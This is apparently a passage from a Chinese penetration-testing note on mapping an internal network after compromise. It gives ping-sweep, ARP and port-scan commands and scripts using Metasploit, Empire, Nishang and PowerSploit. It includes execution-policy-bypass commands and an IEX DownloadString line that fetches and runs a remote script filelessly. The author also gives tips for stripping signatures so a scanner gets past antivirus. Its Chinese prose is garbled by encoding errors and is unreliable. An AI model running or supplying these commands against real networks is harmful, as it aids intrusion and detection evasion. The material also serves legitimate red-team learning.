<td>è¯¥æœºå™¨ç§å¯èƒ½å®‰è£…äº†Exchange</td>
</tr>
<tr>
<td>NOTES</td>
<td>è¯¥æœºå™¨ç§å¯èƒ½å®‰è£…äº†Lotus Notesç”µå­é‚®ä»¶å®¢æˆ·ç«¯</td>
</tr>
<tr>
<td>?</td>
<td>æ²¡æœ‰è¯†åˆ«å¤„è¯¥æœºå™¨çš„NetBIOSèµ„æºï¼ˆå¯ä»¥ä½¿ç”¨-Fé€‰é¡¹å†æ¬¡æ‰«æï¼‰</td>
</tr>
</tbody></table>
<h3 id="2-5-2-åˆ©ç”¨ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘"><a href="#2-5-2-åˆ©ç”¨ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘" class="headerlink" title="2.5.2 åˆ©ç”¨ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘"></a>2.5.2 åˆ©ç”¨ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘</h3><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /L %I <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) <span class="hljs-keyword">DO</span> @ping <span class="hljs-literal">-w</span> <span class="hljs-number">1</span> <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span></code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220112144310180.png" alt="image-20220112144310180"></p>
<p>éœ€è¦ä¿®æ”¹IPåœ°å€æ®µä»¥åŠä¿å­˜ç»“æœçš„è·¯å¾„ï¼ˆé»˜è®¤ä¿å­˜åœ¨<code>C:\Windows\Temp\Result.txt</code>ï¼‰ï¼ŒVBSè„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs vbscript">strSubNet = <span class="hljs-string">&quot;192.168.0.&quot;</span>
<span class="hljs-keyword">Set</span> objFSO= <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.Filesystemobject&quot;</span>)
<span class="hljs-keyword">Set</span> objTs = objfso.CreateTextFile(<span class="hljs-string">&quot;C:\Windows\Temp\Result.txt&quot;</span>)
<span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">254</span>
strComputer = strsubNet &amp; i
blnResult = Ping(strComputer)
<span class="hljs-keyword">If</span> blnResult = <span class="hljs-literal">True</span> <span class="hljs-keyword">Then</span>
objTS.WriteLine strComputer &amp; <span class="hljs-string">&quot; is alived ! :) &quot;</span>
<span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span>
<span class="hljs-keyword">Next</span>
objTS.close
WScript.Echo <span class="hljs-string">&quot;All Ping Scan , All Done ! :) &quot;</span>
<span class="hljs-keyword">Function</span> Ping(strComputer)
<span class="hljs-keyword">Set</span> objWMIService = <span class="hljs-built_in">Getobject</span>(<span class="hljs-string">&quot;winmgmts:\\.\root\cimv2&quot;</span>)
<span class="hljs-keyword">Set</span> colItems = objwMIService.ExecQuery(<span class="hljs-string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="hljs-string">&quot;&#x27;&quot;</span>)
<span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> objItem <span class="hljs-keyword">In</span> colItems
<span class="hljs-keyword">Select</span> <span class="hljs-keyword">case</span> objItem.StatusCode
<span class="hljs-keyword">Case</span> <span class="hljs-number">0</span>
Ping = <span class="hljs-literal">True</span>
<span class="hljs-keyword">Case</span> <span class="hljs-keyword">Else</span>
Ping = <span class="hljs-literal">False</span>
<span class="hljs-keyword">End</span> <span class="hljs-keyword">select</span>
<span class="hljs-keyword">Exit</span> <span class="hljs-keyword">For</span>
<span class="hljs-keyword">Next</span>
<span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span></code></pre>

<p>è¿è¡Œï¼š</p>
<pre><code class="hljs powershell">cscript host<span class="hljs-literal">-scan</span>.vbs</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220112232902425.png" alt="image-20220112232902425"></p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220113013129248.png" alt="image-20220113013129248"></p>
<h3 id="2-5-3-é€šè¿‡ARPæ‰«ææ¢æµ‹å†…ç½‘"><a href="#2-5-3-é€šè¿‡ARPæ‰«ææ¢æµ‹å†…ç½‘" class="headerlink" title="2.5.3 é€šè¿‡ARPæ‰«ææ¢æµ‹å†…ç½‘"></a>2.5.3 é€šè¿‡ARPæ‰«ææ¢æµ‹å†…ç½‘</h3><h4 id="1-arp-scanå·¥å…·"><a href="#1-arp-scanå·¥å…·" class="headerlink" title="1. arp-scanå·¥å…·"></a>1. arp-scanå·¥å…·</h4><p>â€‹    å·¥å…·ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-%E3%80%81https://github.com/royhills/arp-scan/releases/tag/1.9">https://github.com/QbsuranAlang/arp-scan-windows-ã€https://github.com/royhills/arp-scan/releases/tag/1.9</a></p>
<p>æ‰“åŒ…éœ€è¦ä¿®æ”¹<code>msvcbuild.bat</code> æ–‡ä»¶ä¸­çš„<code>vcvarsall.bat</code>çš„è·¯å¾„ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220113001042955.png" alt="image-20220113001042955"></p>
<p>ç”¨æ³•ï¼š</p>
<pre><code class="hljs powershell">arp<span class="hljs-literal">-scan</span>.exe <span class="hljs-literal">-t</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span>/<span class="hljs-number">24</span></code></pre>

<p>æ‰«æç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220113022642792.png" alt="image-20220113022642792"></p>
<h4 id="2-Empireä¸­çš„arpscanæ¨¡å—"><a href="#2-Empireä¸­çš„arpscanæ¨¡å—" class="headerlink" title="2. Empireä¸­çš„arpscanæ¨¡å—"></a>2. Empireä¸­çš„arpscanæ¨¡å—</h4><p>â€‹        repo:<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire/releases/tag/2.5">https://github.com/EmpireProject/Empire/releases/tag/2.5</a></p>
<pre><code class="hljs shell">usemodule powershell/situational_awareness/network/arpscan</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220113022020793.png" alt="image-20220113022020793"></p>
<h4 id="3-Nishangä¸­çš„Invoke-ARPScan-ps1è„šæœ¬"><a href="#3-Nishangä¸­çš„Invoke-ARPScan-ps1è„šæœ¬" class="headerlink" title="3. Nishangä¸­çš„Invoke-ARPScan.ps1è„šæœ¬"></a>3. Nishangä¸­çš„<code>Invoke-ARPScan.ps1</code>è„šæœ¬</h4><p>â€‹        repo:<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/releases">https://github.com/samratashok/nishang/releases</a></p>
<p>é€šå¤–ç½‘çš„è¯å¯ä»¥ç›´æ¥è¿œç¨‹åŠ è½½ï¼Œå¦åˆ™çš„è¯å°±ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸­è¿è¡Œã€‚å¹¶æ²¡æœ‰åœ¨Nishangä¸­å‘ç°è¯¥è„šæœ¬ï¼Œä½†æ˜¯åœ¨Empireä¸­å‘ç°äº†è¯¥PS1è„šæœ¬ã€‚</p>
<pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module C:\test\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.2.0/24&#125;&quot;</span> &gt;&gt; C:\test\log.txt</code></pre>

<p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220113024355457.png" alt="image-20220113024355457"  />

<h3 id="2-5-4-é€šè¿‡å¸¸è§„TCP-UDPç«¯å£æ‰«ææ¢æµ‹å†…ç½‘"><a href="#2-5-4-é€šè¿‡å¸¸è§„TCP-UDPç«¯å£æ‰«ææ¢æµ‹å†…ç½‘" class="headerlink" title="2.5.4 é€šè¿‡å¸¸è§„TCP/UDPç«¯å£æ‰«ææ¢æµ‹å†…ç½‘"></a>2.5.4 é€šè¿‡å¸¸è§„TCP/UDPç«¯å£æ‰«ææ¢æµ‹å†…ç½‘</h3><p>â€‹        ScanLine æ˜¯â€”æ¬¾ç»å…¸çš„ç«¯å£æ‰«æå·¥å…·ï¼Œå¯ä»¥åœ¨æ‰€æœ‰ç‰ˆæœ¬çš„Windowsæ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œä½“ç§¯å°ï¼Œä»…ä½¿ç”¨å•ä¸ªæ–‡ä»¶ï¼ŒåŒæ—¶æ”¯æŒTCPï¼UDP ç«¯å£æ‰«æï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs powershell">scanline <span class="hljs-literal">-ht</span> <span class="hljs-number">21</span><span class="hljs-literal">-23</span>,<span class="hljs-number">25</span>,<span class="hljs-number">80</span><span class="hljs-literal">-89</span>,<span class="hljs-number">110</span>,<span class="hljs-number">135</span><span class="hljs-literal">-139</span>,<span class="hljs-number">143</span>,<span class="hljs-number">389</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">1099</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">5432</span>,<span class="hljs-number">5556</span>,<span class="hljs-number">5631</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">6379</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">8080</span> <span class="hljs-literal">-hu</span> <span class="hljs-number">53</span>,<span class="hljs-number">161</span>,<span class="hljs-number">137</span>,<span class="hljs-number">139</span> <span class="hljs-literal">-O</span> c:\test\log.txt <span class="hljs-literal">-p</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span><span class="hljs-literal">-254</span> /b</code></pre>

<p>ä¸è¿‡ç°åœ¨ä¼šè¢«æŸ¥æ€ï¼Œä¸€èˆ¬ç”¨ä¸åˆ°äº†ï¼Œä»…ä½œäº†è§£ã€‚</p>
<h2 id="2-6-æ‰«æåŸŸå†…ç«¯å£"><a href="#2-6-æ‰«æåŸŸå†…ç«¯å£" class="headerlink" title="2.6 æ‰«æåŸŸå†…ç«¯å£"></a>2.6 æ‰«æåŸŸå†…ç«¯å£</h2><ul>
<li>ç«¯å£bannerä¿¡æ¯</li>
<li>ç«¯å£ä¸Šå¸¸è§è¿è¡Œçš„æœåŠ¡</li>
<li>å¸¸è§åº”ç”¨çš„é»˜è®¤ç«¯å£</li>
</ul>
<h3 id="2-6-1-Telnetæ‰«æ"><a href="#2-6-1-Telnetæ‰«æ" class="headerlink" title="2.6.1 Telnetæ‰«æ"></a>2.6.1 Telnetæ‰«æ</h3><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">å•ä¸ªå‘½ä»¤</span>
telnet 192.168.1.2 3389</code></pre>

<p>batè„šæœ¬ï¼š<a target="_blank" rel="noopener" href="https://maikefee.com/archives/7c32cf47.html">https://maikefee.com/archives/7c32cf47.html</a></p>
<pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off
<span class="hljs-built_in">set</span> Cms=%*
<span class="hljs-built_in">setlocal</span> enabledelayedexpansion
<span class="hljs-built_in">chcp</span> <span class="hljs-number">65001</span>
<span class="hljs-built_in">set</span> files=&quot;&quot;
<span class="hljs-built_in">set</span> ports=&quot;&quot; 
<span class="hljs-built_in">color</span> <span class="hljs-number">06</span>
<span class="hljs-built_in">title</span> telnet-scanç«¯å£æ‰«æå·¥å…·
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">defined</span> Cms <span class="hljs-keyword">goto</span> main
::-----------------å‚æ•°åˆ†ç¦»å¼€å§‹-----------------------------------
<span class="hljs-keyword">if</span> &quot;%<span class="hljs-number">1</span>&quot; == &quot;-l&quot; (
<span class="hljs-built_in">set</span> files=%<span class="hljs-number">2</span>
)
<span class="hljs-keyword">if</span> &quot;%<span class="hljs-number">1</span>&quot; == &quot;-d&quot; (
<span class="hljs-keyword">goto</span> del_history
)
<span class="hljs-keyword">if</span> &quot;%<span class="hljs-number">3</span>&quot; == &quot;-l&quot; (
<span class="hljs-built_in">set</span> files=%<span class="hljs-number">4</span>
)
<span class="hljs-keyword">if</span> &quot;%<span class="hljs-number">1</span>&quot; == &quot;-p&quot; (
<span class="hljs-built_in">set</span> ports=%<span class="hljs-number">2</span>
)
<span class="hljs-keyword">if</span> &quot;%<span class="hljs-number">3</span>&quot; == &quot;-p&quot; (
<span class="hljs-built_in">set</span> ports=%<span class="hljs-number">4</span>
)
<span class="hljs-built_in">echo</span> <span class="hljs-variable">%ports%</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">%files%</span>
::-----------------å‚æ•°åˆ†ç¦»ç»“æŸ-----------------------------------

::è®¡ç®—åŸŸåæ€»æ•°
<span class="hljs-built_in">set</span> /a num=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> /f <span class="hljs-variable">%%i</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">%files%</span>) <span class="hljs-keyword">do</span> (
<span class="hljs-built_in">set</span> /a num=<span class="hljs-variable">!num!</span>+<span class="hljs-number">1</span>
)


::----------------------å¼€å§‹æ‰«æ----------------------------------
<span class="hljs-built_in">set</span> /a a=<span class="hljs-number">1</span>
:sxh
<span class="hljs-built_in">set</span> port=&quot;&quot;
<span class="hljs-keyword">for</span> /f &quot;tokens=<span class="hljs-variable">%a%</span> delims=.&quot; <span class="hljs-variable">%%i</span> <span class="hljs-keyword">in</span> (&#x27;<span class="hljs-built_in">echo</span> <span class="hljs-variable">%ports%</span>&#x27;) <span class="hljs-keyword">do</span> (
<span class="hljs-built_in">set</span> port=<span class="hljs-variable">%%i</span>
<span class="hljs-built_in">set</span> /a a=<span class="hljs-variable">%a%</span>+<span class="hljs-number">1</span>
)
<span class="hljs-keyword">if</span> <span class="hljs-variable">!port!</span> <span class="hljs-keyword">NEQ</span> &quot;&quot; (
<span class="hljs-built_in">echo</span> --------------------ç¨‹åºæ­£åœ¨æ‰«æ <span class="hljs-variable">!port!</span> ç«¯å£,è¯·ç¨å---------------------------------
::è®¾ç½®æ‰«æåˆ°ç¬¬å‡ ä¸ªåŸŸå
<span class="hljs-built_in">set</span> /a nm=<span class="hljs-number">0</span> 
::è®¾ç½®æç¤ºä¿å­˜
<span class="hljs-built_in">set</span> /a tib=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> /f <span class="hljs-variable">%%b</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">%files%</span>) <span class="hljs-keyword">do</span> (
<span class="hljs-built_in">start</span> /min <span class="hljs-built_in">cmd</span>.exe /k &quot;<span class="hljs-built_in">echo</span> q|telnet <span class="hljs-variable">%%b</span> <span class="hljs-variable">!port!</span>&amp;<span class="hljs-keyword">exit</span>&quot;
timeout /NOBREAK /t <span class="hljs-number">1</span> &gt;<span class="hljs-built_in">nul</span>
<span class="hljs-built_in">set</span> pd=&quot;&quot;
<span class="hljs-keyword">for</span> /f &quot;tokens=<span class="hljs-number">1</span> delims= &quot; <span class="hljs-variable">%%a</span> <span class="hljs-keyword">in</span> (&#x27;tasklist /FI &quot;windowtitle eq Telnet <span class="hljs-variable">%%b</span>&quot;^|<span class="hljs-built_in">findstr</span> &quot;<span class="hljs-built_in">cmd</span>.exe&quot;&#x27;) <span class="hljs-keyword">do</span> (
<span class="hljs-built_in">set</span> pd=<span class="hljs-variable">%%a</span>
)
<span class="hljs-keyword">if</span> <span class="hljs-variable">!pd!</span> <span class="hljs-keyword">EQU</span> &quot;&quot; (
<span class="hljs-built_in">echo</span> <span class="hljs-variable">%%b</span> <span class="hljs-variable">!port!</span> Open
<span class="hljs-built_in">echo</span> <span class="hljs-variable">%%b</span>&gt;&gt;<span class="hljs-variable">!port!</span>_Open.txt
<span class="hljs-built_in">set</span> /a tib=<span class="hljs-number">1</span>
) <span class="hljs-keyword">else</span> (
<span class="hljs-built_in">echo</span> <span class="hljs-variable">%%b</span> <span class="hljs-variable">!port!</span> Close
)
<span class="hljs-built_in">set</span> /a nm=<span class="hljs-variable">!nm!</span>+<span class="hljs-number">1</span>
<span class="hljs-built_in">title</span> telnet-scanç«¯å£æ‰«æå·¥å…· è¿›åº¦ <span class="hljs-variable">!nm!</span>/<span class="hljs-variable">!num!</span>
)
<span class="hljs-keyword">if</span> <span class="hljs-variable">!tib!</span> == <span class="hljs-number">0</span> (
<span class="hljs-built_in">echo</span> -------------------------ç«¯å£ <span class="hljs-variable">!port!</span> æ‰«æå®Œæ¯•-----------------------------------------
) <span class="hljs-keyword">else</span> (
<span class="hljs-built_in">echo</span> -------------------------ç«¯å£ <span class="hljs-variable">!port!</span> æ‰«æå®Œæ¯•,ä¿å­˜ä¸º <span class="hljs-variable">!port!</span>_Open.txt-----------------------
)
timeout /NOBREAK /t <span class="hljs-number">35</span> &gt;<span class="hljs-built_in">nul</span>
<span class="hljs-keyword">goto</span> sxh
) <span class="hljs-keyword">else</span> (
<span class="hljs-keyword">goto</span> tc
)
::----------------------æ‰«æç»“æŸ----------------------------------
:del_history
<span class="hljs-built_in">echo</span> æ­£åœ¨åˆ é™¤å†å²æ‰«æè®°å½•,è¯·ç¨å.......
<span class="hljs-keyword">for</span> /l <span class="hljs-variable">%%i</span> <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>) <span class="hljs-keyword">do</span> (
<span class="hljs-built_in">del</span> /f /q <span class="hljs-variable">%%i</span>_Open.txt <span class="hljs-number">1</span>&gt;<span class="hljs-built_in">nul</span> <span class="hljs-number">2</span>&gt;<span class="hljs-built_in">nul</span>
)
<span class="hljs-built_in">echo</span> åˆ é™¤å®Œæ¯•<span class="hljs-variable">!!!</span>
<span class="hljs-keyword">goto</span> tc
:main
<span class="hljs-built_in">mode</span> <span class="hljs-built_in">con</span>: cols=<span class="hljs-number">125</span> lines=<span class="hljs-number">45</span>
<span class="hljs-built_in">echo</span>  _       _            _ 
<span class="hljs-built_in">echo</span> ^| ^|_ ___^| ^|_ __   ___^| ^|_     ___  ___ __ _ _ __  
<span class="hljs-built_in">echo</span> ^| __^/ _ ^\ ^| ^&#x27;_ ^\ ^/ _ ^\ __^|____^/ __^|^/ __^/ _^` ^| ^&#x27;_ ^\
<span class="hljs-built_in">echo</span> ^| ^|^|  __^/ ^| ^| ^| ^|  __^/ ^|^|_____^\__ ^\ ^(_^| ^(_^| ^| ^| ^| ^|
<span class="hljs-built_in">echo</span>  ^\__^\___^|_^|_^| ^|_^|^\___^|^\__^|    ^|___^/^\___^\__^,_^|_^| ^|_^|
<span class="hljs-built_in">echo</span>.
<span class="hljs-built_in">echo</span>      ^&lt;options^&gt;:
<span class="hljs-built_in">echo</span>                  -l  list     :åŸŸååˆ—è¡¨æ–‡ä»¶
<span class="hljs-built_in">echo</span>                  -p  port     :è¦æ‰«æçš„ç«¯å£
<span class="hljs-built_in">echo</span>                  -d  <span class="hljs-built_in">del</span>      :åˆ é™¤ä¿å­˜çš„å†å²è®°å½•(å¼€æ”¾çš„ç«¯å£å·.txt)                       
<span class="hljs-built_in">echo</span>.
<span class="hljs-built_in">echo</span>       ^&lt;Example^&gt;:
<span class="hljs-built_in">echo</span>                   scan.bat -l c:\host.txt -p <span class="hljs-number">21</span>   
<span class="hljs-built_in">echo</span>                   scan.bat -l c:\host.txt -p <span class="hljs-number">21</span>.<span class="hljs-number">80</span>.<span class="hljs-number">3389</span>.<span class="hljs-number">1433</span>                
<span class="hljs-built_in">echo</span>.
:tc</code></pre>



<h3 id="2-6-2-Sæ‰«æå™¨"><a href="#2-6-2-Sæ‰«æå™¨" class="headerlink" title="2.6.2 Sæ‰«æå™¨"></a>2.6.2 Sæ‰«æå™¨</h3><p>Repo: <a target="_blank" rel="noopener" href="https://github.com/kingron/s">https://github.com/kingron/s</a></p>
<pre><code class="hljs bash">s.exe TCPSYN Start IP [End IP] Ports [Threads] [/T(N)] [/(H)Banner] [/Save]
Eg-1: s.exe TCP 192.168.0.1 192.168.0.254 80 512
Eg-2: s.exe TCP 192.168.0.1/24 80 512
Eg-3: s.exe TCP 192.168.0.1/24 80 512 /T8 /Save
Eg-4: s.exe TCP 192.168.0.1 192.168.0.254 80 512 /HBanner
Eg-5: s.exe TCP 192.168.0.1 192.168.0.254 21 512 /Banner
Eg-6: s.exe TCP 192.168.0.1 1-65535 512
Eg-7: s.exe TCP 192.168.0.1 192.168.0.254 21,3389,5631 512
Eg-8: s.exe TCP 192.168.0.1 21,3389,5631 512
Eg-9: s.exe SYN 192.168.0.1 192.168.0.254 80
Eg-10: s.exe SYN 192.168.0.1 1-65535
Eg-11: s.exe SYN 192.168.0.1 192.168.0.254 21,80,3389
Eg-12: s.exe SYN 192.168.0.1 21,80,3389</code></pre>

<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220410224123078.png" alt="image-20220410224123078" style="zoom:50%;" />

<p>éœ€è¦å¯¹ç‰¹å¾è¿›è¡Œæ“¦é™¤ï¼Œå¦åˆ™è¿‡ä¸äº†æ€è½¯ï¼Œä¾‹å¦‚ï¼šprintfå‡½æ•°çš„å‡ ä¸ªè¾“å‡ºå€¼ã€æ³¨é‡Šå†…å®¹ã€‚é¢æ€æ‰“åŒ…åçš„s.exeï¼š</p>
<p>repoï¼š<a target="_blank" rel="noopener" href="https://github.com/SevenC-base/PostExploitation/blob/master/windows/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/s.exe">https://github.com/SevenC-base/PostExploitation/blob/master/windows/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/s.exe</a></p>
<p>å†…ç½‘æ‰«æä¸å»ºè®®ä½¿ç”¨ï¼Œå¯èƒ½å¯¼è‡´æ–­ç½‘ï¼Œå‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://f5.pm/go-78126.html%E3%80%82">https://f5.pm/go-78126.htmlã€‚</a></p>
<h3 id="2-6-3-Metasploitç«¯å£æ‰«æ"><a href="#2-6-3-Metasploitç«¯å£æ‰«æ" class="headerlink" title="2.6.3 Metasploitç«¯å£æ‰«æ"></a>2.6.3 Metasploitç«¯å£æ‰«æ</h3><p>Metasploitä¸ä»…æä¾›äº†å¤šç§ç«¯å£æ‰«ææŠ€æœ¯ï¼Œè¿˜æä¾›äº†ä¸å…¶ä»–æ‰«æå·¥å…·çš„æ¥å£ã€‚kaliä¸­è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs bash">$ msfconsole
msf6 &gt; search portscan
msf6 &gt; use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> rhosts 192.168.0.1/24
rhosts =&gt; 192.168.0.1/24
msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> ports 1-1024
ports =&gt; 1-1024
msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> threads 50
threads =&gt; 50
msf6 auxiliary(scanner/portscan/tcp) &gt; run</code></pre>

<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220413213705601.png" alt="image-20220413213705601" style="zoom:50%;" />

<h3 id="2-6-4-PowerSploit-çš„-Invoke-portscan-ps1-è„šæœ¬"><a href="#2-6-4-PowerSploit-çš„-Invoke-portscan-ps1-è„šæœ¬" class="headerlink" title="2.6.4 PowerSploit çš„ Invoke-portscan.ps1 è„šæœ¬"></a>2.6.4 PowerSploit çš„ Invoke-portscan.ps1 è„šæœ¬</h3><p><code>PowerSploit</code>çš„ <code>Invoke-Portscan.psl</code> è„šæœ¬ï¼Œæ¨èä½¿ç”¨æ— æ–‡ä»¶çš„å½¢å¼è¿›è¡Œæ‰«æï¼Œè¿œç¨‹åŠ è½½æ‰§è¡Œ:</p>
<pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-object Net.Webclient).Downloadstring(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.0.1/24 -T4 -ports &#x27;3389,80&#x27; -oA c:\windows\temp\res.txt&quot;</span></code></pre>

<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220413215248868.png" alt="image-20220413215248868" style="zoom:50%;" />

<h3 id="2-6-5-Nishang-çš„-Invoke-Portscan-æ¨¡å—"><a href="#2-6-5-Nishang-çš„-Invoke-Portscan-æ¨¡å—" class="headerlink" title="2.6.5 Nishang çš„ Invoke-Portscan æ¨¡å—"></a>2.6.5 Nishang çš„ Invoke-Portscan æ¨¡å—</h3><p>â€‹        <code>Invoke-PortScan</code>æ˜¯ <code>Nishang</code> çš„ç«¯å£æ‰«ææ¨¡å—ï¼Œç”¨äºå‘ç°ä¸»æœºã€è§£æä¸»æœºåã€æ‰«æç«¯å£ï¼Œæ˜¯ä¸€ä¸ªå¾ˆå®ç”¨çš„æ¨¡å—ã€‚è¾“å…¥<code>Get-Help Invoke-PortScan-full</code> å‘½ä»¤ï¼Œå³å¯æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ã€‚<code>Invoke-PortScan</code>çš„å‚æ•°ä»‹ç»å¦‚ä¸‹ã€‚</p>
<ul>
<li><p>StartAddress: æ‰«æèŒƒå›´çš„å¼€å§‹åœ°å€ã€‚</p>
</li>
<li><p>EndAddress: æ‰«æèŒƒå›´çš„ç»“æŸåœ°å€ã€‚</p>
</li>
<li><p>ScanPort: è¿›è¡Œç«¯å£æ‰«æã€‚</p>
</li>
<li><p>Port: æŒ‡å®šæ‰«æç«¯å£ã€‚<br>é»˜è®¤æ‰«æçš„ç«¯å£æœ‰21ã€22ã€23ã€53ã€69ã€71ã€80ã€98ã€110ã€139ã€111ã€389ã€443ã€445ã€1080ã€1433ã€2001ã€2049ã€3001ã€3128ã€5222ã€6667ã€6868ã€7777ã€7878ã€8080ã€1521ã€3306ã€3389ã€5801ã€5900ã€5555ã€5901ã€‚</p>
</li>
<li><p>TimeOut:è®¾ç½®è¶…æ—¶æ—¶é—´ã€‚</p>
</li>
</ul>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯¹æœ¬åœ°å±€åŸŸç½‘è¿›è¡Œæ‰«æï¼Œæœç´¢å­˜æ´»ä¸»æœºå¹¶è§£æä¸»æœºåã€‚</p>
<pre><code class="hljs powershell"><span class="hljs-comment"># ResolveHostå‚æ•°å­˜åœ¨å¼‚å¸¸æŠ¥é”™</span>
<span class="hljs-built_in">Invoke-Portscan</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.255</span> <span class="hljs-literal">-ResolveHost</span>
<span class="hljs-comment"># ä¸ä½¿ç”¨ResolveHost</span>
<span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;Invoke-Portscan.ps1&quot;</span>);<span class="hljs-built_in">Invoke-PortScan</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.254</span></code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220413221639837.png" alt="image-20220413221639837"></p>
